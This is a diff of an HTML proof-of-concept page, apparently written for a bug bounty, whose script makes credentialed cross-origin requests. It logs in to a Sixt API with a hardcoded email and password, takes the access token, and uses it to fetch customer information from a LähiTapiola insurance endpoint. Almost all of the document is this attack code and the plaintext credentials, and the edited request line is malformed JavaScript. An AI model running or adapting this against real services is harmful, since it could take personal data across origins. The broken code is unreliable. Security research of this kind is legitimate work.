@@ -9,23 +9,17 @@
     xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
     var parse = JSON.parse(this.response);
-    window.token2 = parse.access_token;
-    setTimeout(getdata, 500);
+    window.token2 = parse.accessToken;
+    setTimeout(login2, 500);
     }
     };
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https:\/\/web-api.orange.sixt.com\/v1\/auth\/login", true);
-        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
-        xhr.setRequestHeader("Accept-Language", "en-US");
-        xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
-        xhr.withCredentials = true;
-        var body = "{\"userName\":\"pwny_sec@wearehackerone.com\",\"password\":\"Chickenpwny1;\"}";
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i); 
-        xhr.send(new Blob([aBody]));
+  xhttp.open("POST", "https://web-api.orange.sixt.com/v1/auth/login", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+  var params = "userName":"pwny_sec@wearehackerone.com","password":"Chickenpwny1;";
+  xhttp.send(params);
       }
-      function getdata()
+function login2()
 {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
@@ -34,15 +28,16 @@
     window.response = this.responseText;
     }
   };
-  xhttp.open("GET", "https://normandy.cdn.mozilla.net/api/v1/", true);
+  xhttp.open("GET", "https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/customerInformation", true);
   xhttp.withCredentials = true;
   xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
   xhttp.setRequestHeader("Authorization", "Bearer "+token2);
   xhttp.send();
 }
+
       </script>
       <form action="#">
-      <input type="button" value="Submit request" onclick="submitRequest();" />
+      <input type="button" value="Submit request" onclick="login();" />
     </form>
   </body>
 </html>
